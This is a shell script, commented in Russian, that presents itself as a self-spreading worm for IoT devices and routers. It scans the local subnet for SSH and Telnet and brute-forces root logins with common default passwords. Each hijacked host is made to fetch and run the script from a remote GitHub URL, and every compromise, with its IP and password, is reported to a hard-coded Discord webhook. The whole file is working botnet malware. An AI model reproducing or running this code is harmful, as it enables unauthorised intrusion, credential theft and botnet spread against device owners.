#!/bin/sh

# ==========================================
# НАСТРОЙКИ ЧЕРВЯ (Оптимизировано для IoT/Router)
# ==========================================

# Твой Discord Webhook
WEBHOOK="https://discord.com/api/webhooks/1574870843085955124/RYOu5Y9Xv-9bjUAzqpfV6po-gRqUchf1RpjktbQKWE6MeTS6QDtkH_dXm7y_abW6stPQ"

# Ссылка на этот же скрипт (используем curl, он есть везде)
BOT_URL="https://raw.githubusercontent.com/traiantadgs-ops/exe/main/botnet.sh"

# Пароли (добавь свои, если знаешь общие дефолтные)
PASSWORDS="admin password root 123456 letmein default administrator"

# ==========================================
# ЛОГИКА
# ==========================================

# Отправка лога в Discord
log_discord() {
    # Используем curl, так как он легче wget
    curl -s -X POST -H "Content-Type: application/json" \
         -d "{\"content\":\"$1\"}" "$WEBHOOK" > /dev/null 2>&1
}

# Получаем свой IP (работает на большинстве систем)
MY_IP=$(hostname -I 2>/dev/null | awk '{print $1}')
# Если hostname -I не работает, пробуем другой способ
if [ -z "$MY_IP" ]; then
    MY_IP=$(ip addr show eth0 2>/dev/null | grep 'inet ' | awk '{print $2}' | cut -d/ -f1)
fi

# Если IP все равно не нашли, выходим
if [ -z "$MY_IP" ]; then
    exit 1
fi

scan_and_infect() {
    # Берем подсеть из нашего IP (например, 192.168.1.)
    SUBNET=$(echo $MY_IP | cut -d. -f1-3)
    
    # Сканируем только первые 50 адресов, чтобы не грузить CPU роутера
    for i in $(seq 1 50); do
        TARGET="${SUBNET}.${i}"
        
        # Пропускаем себя
        if [ "$TARGET" == "$MY_IP" ]; then continue; fi
        
        # Быстрая проверка: открыт ли порт 22 (SSH) или 23 (Telnet)
        # Используем /dev/tcp, это встроенная функция bash/sh
        if timeout 1 bash -c "</dev/tcp/$TARGET/22" 2>/dev/null || timeout 1 bash -c "</dev/tcp/$TARGET/23" 2>/dev/null; then
            echo "[*] Найден хост: $TARGET"
            
            # Перебор паролей
            for pass in $PASSWORDS; do
                
                # Пытаемся выполнить команду через sshpass
                # Важно: используем -o StrictHostKeyChecking=no и -o UserKnownHostsFile=/dev/null
                CMD="/bin/sh -c 'curl -s $BOT_URL | /bin/sh &'"
                
                # Пробуем SSH
                RESULT=$(sshpass -p "$pass" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=2 -o BatchMode=yes root@$TARGET "$CMD" 2>/dev/null)
                
                if [ $? -eq 0 ]; then
                    echo "[+] Заражен: $TARGET (Pass: $pass)"
                    log_discord "**NEW ZOMBIE**\nIP: $TARGET\nPass: $pass"
                    
                    # Запускаем самого себя локально, чтобы он тоже начал сканировать
                    # Используем фоновый процесс (&)
                    curl -s $BOT_URL | /bin/sh &
                    
                    # Пауза, чтобы не спалить себя трафиком
                    sleep 1
                    break # Выходим из цикла паролей, переходим к следующему IP
                fi
            done
        fi
    done
}

# Запуск
echo "[*] Запуск червя..."
while true; do
    scan_and_infect
    sleep 30 # Ждем 30 секунд перед новым кругом
done
